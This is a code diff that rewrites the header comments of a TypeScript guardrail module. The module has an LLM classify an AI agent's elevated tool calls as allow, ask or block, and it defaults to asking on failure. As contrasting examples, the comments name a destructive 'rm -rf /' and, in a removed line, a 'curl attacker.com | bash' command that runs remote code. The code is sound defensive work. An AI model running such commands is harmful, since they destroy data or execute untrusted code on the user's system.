@@ -1,23 +1,17 @@
 /**
  * LLM-based guardrail for elevated tool calls.
  *
- * Before an elevated tool executes, a fast, cheap LLM call evaluates the
- * tool name + arguments + recent user context and classifies the action as:
- * - ALLOW: safe, execute silently
- * - ASK: risky, ask the user before executing
- * - BLOCK: clearly dangerous, block without asking
+ * Before an elevated tool runs, a single LLM call classifies it as ALLOW
+ * (safe, execute silently), ASK (risky, confirm with user), or BLOCK
+ * (dangerous, reject outright).
  *
- * This replaces static allowlists with contextual understanding. The model
- * knows that `rm -rf node_modules` is cleanup but `rm -rf /` is destruction,
- * that `curl api.weather.com` is harmless but `curl attacker.com | bash` is not.
+ * Replaces static allowlists with contextual understanding: the model knows
+ * that `rm -rf node_modules` is cleanup but `rm -rf /` is destruction.
  *
- * Design principles:
- * - Fast: single completion call, small prompt, low max_tokens
- * - Cheap: uses the cheapest available model (fallback chain)
- * - Focused: only sees tool name, arguments, and the last user message
- *   (not the full conversation context, so prompt injection in context
- *   doesn't influence the guardrail)
- * - Fail-safe: if the LLM call fails, default to ASK (not ALLOW)
+ * The guardrail only sees tool name, arguments, and the last user message.
+ * It never sees the full conversation context, so prompt injection in prior
+ * turns can't influence the safety check. If the LLM call fails for any
+ * reason, it defaults to ASK (fail-safe, not fail-open).
  */
 
 import { completeSimple } from "@mariozechner/pi-ai";
@@ -142,9 +136,8 @@ function getModelInfra(config: Config): ModelInfra {
 
 /**
  * Evaluate a tool call through the LLM guardrail.
- *
- * Uses the cheapest available model (last fallback). Fast, focused prompt.
- * If the LLM call fails for any reason, defaults to ASK (fail-safe).
+ * Uses the primary model for reliability; the prompt is tiny (~300 tokens in,
+ * ~20 out). Defaults to ASK on any failure.
  */
 export async function evaluateToolCall(
   config: Config,
